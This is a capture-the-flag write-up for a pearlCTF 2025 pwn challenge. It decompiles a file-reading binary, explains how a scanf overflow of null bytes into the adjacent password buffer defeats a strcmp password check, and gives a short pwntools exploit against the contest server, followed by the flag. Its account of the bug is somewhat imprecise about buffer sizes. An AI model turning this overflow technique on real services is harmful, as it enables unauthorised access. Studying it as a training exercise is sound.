# Readme Please

{% hint style="info" %}
Category: PWN

Difficulty: easy
{% endhint %}

## Description

> I made a very secure file reading service.
>
> **Links**: nc readme-please.ctf.pearlctf.in 30039
>
> **Files**: _readme\_src.zip_

## Solve Walkthrough

* This is also a simple pwn challenge, without special technique. Only depends on your logic and knowledge in binary.
* First, after we unzip the source code, let's check the ELF binary protection.

```bash
[*] '/home/hurtz4eva/Nextcloud/CTF/international/pearlCTF/2025/pwn/readme_please/source/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

* This is a list of available functions inside the binary.

<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

* We only got 2 interesting function symbols, which is the `main` function and `generate_password` function.
* Here's the decompiled of `main` and `generate_password` functions.

{% tabs %}
{% tab title="main" %}
```c
// main function.
undefined8 main(void)

{
  int iVar1;
  char *pcVar2;
  FILE *__stream;
  long in_FS_OFFSET;
  int local_18c;
  char local_178 [112];
  char local_108 [112];
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  generate_password(local_98,0x7f);
  printf("Welcome to file reading service!");
  fflush(stdout);
  local_18c = 0;
  do {
    if (1 < local_18c) {
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
    printf("\nEnter the file name: ");
    fflush(stdout);
    __isoc99_scanf(&DAT_00102088,local_178);
    pcVar2 = __xpg_basename(local_178);
    __stream = fopen(local_178,"r");
    if (__stream == (FILE *)0x0) {
      puts("Please don\'t try anything funny!");
      fflush(stdout);
    }
    else {
      iVar1 = strcmp(pcVar2,"flag.txt");
      if (iVar1 == 0) {
        printf("Enter password: ");
        fflush(stdout);
        __isoc99_scanf(&DAT_00102088,local_108);
        iVar1 = strcmp(local_108,local_98);
        if (iVar1 != 0) {
          puts("Incorrect password!");
          fflush(stdout);
          goto LAB_001015f2;
        }
      }
      while( true ) {
        pcVar2 = fgets(local_108,100,__stream);
        if (pcVar2 == (char *)0x0) break;
        printf("%s",local_108);
        fflush(stdout);
      }
      fclose(__stream);
    }
LAB_001015f2:
    local_18c = local_18c + 1;
  } while( true );
}
```
{% endtab %}

{% tab title="generate_password" %}
```c
void generate_password(void *param_1,ulong param_2)

{
  char cVar1;
  int __fd;
  ulong uVar2;
  ulong local_10;
  
  __fd = open("/dev/urandom",0);
  if (__fd < 0) {
    perror("Failed to open /dev/urandom");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  uVar2 = read(__fd,param_1,param_2);
  if (uVar2 != param_2) {
    perror("Failed to read random bytes");
    close(__fd);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  close(__fd);
  for (local_10 = 0; local_10 < param_2; local_10 = local_10 + 1) {
    cVar1 = *(char *)(local_10 + (long)param_1);
    *(char *)(local_10 + (long)param_1) =
         cVar1 + ((char)((short)(cVar1 * 0x100af) >> 0xe) - (cVar1 >> 7)) * -0x5e + '!';
  }
  *(undefined1 *)(param_2 + (long)param_1) = 0;
  return;
}
```
{% endtab %}
{% endtabs %}

* Pretty long huh?, but the code is straightforward:
  * First, the code will generate a new password to protect the `files/flag.txt` file that we inputed. The password is randomly generated from `/dev/urandom` file and will be store in `local_98` array with only **112 Bytes**.
  * We've to input the correct path of a target file that we want to read. There are only 3 files that we can read from the remote machine, including `flag.txt`, `default.txt`, and the `note-1.txt` (I aware you not to read this file :v).
  * If we type: `files/flag.txt` , it means that **we've to provide the password**. Otherwise, all files can be read without have to provide a password.
  * **Tips**: Don't get too confused in the password transformation from `/dev/urandom` in the `generate_password` function. _Better leave it_ haha..
* Notice that in the `main` function is comparing a string of `local_98` (**generated password**) with a `local_108` (**user input password**).

{% code title="main" overflow="wrap" lineNumbers="true" %}
```c
  // snipped code.
    if (__stream == (FILE *)0x0) {
      puts("Please don\'t try anything funny!");
      fflush(stdout);
    }
    else {
      iVar1 = strcmp(pcVar2,"flag.txt");
      if (iVar1 == 0) {
        printf("Enter password: ");
        fflush(stdout);
        __isoc99_scanf(&DAT_00102088,local_108);
        iVar1 = strcmp(local_108,local_98); // vuln is happen here.
        if (iVar1 != 0) {
          puts("Incorrect password!");
          fflush(stdout);
          goto LAB_001015f2;
        }
      }
  // snipped code.
```
{% endcode %}

* How we can bypass the condition? Since it was using the `strcmp` function, so we can send some `\x00` (**NULL Byte**) characters in the input password prompt.
* But, how long the `\x00` characters that we need? It's only **`112` Bytes** (**0x70**) until our input is reach the max of array length.
* So, here's my exploit script.

{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/env python3

from pwn import *
import itertools

context.binary = elf = ELF("./main", checksec=0)
context.log_level = "DEBUG"

is_remote = True

if is_remote:
    io = remote("readme-please.ctf.pearlctf.in", 30039)
else:
    io = elf.process()

# Send first request to read the flag.txt file.
io.sendlineafter(b"Enter the file name: ", b"files/flag.txt")

# Abuse the string comparison with \x00 characters.
io.sendlineafter(b"Enter password: ", b"\x00"*0x70) # 112 Bytes.

print(io.recvall(timeout=1))

# Close the remote connection.
io.close()
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

## Flag

<kbd>pearl{f1l3\_d3script0rs\_4r3\_c00l}</kbd>
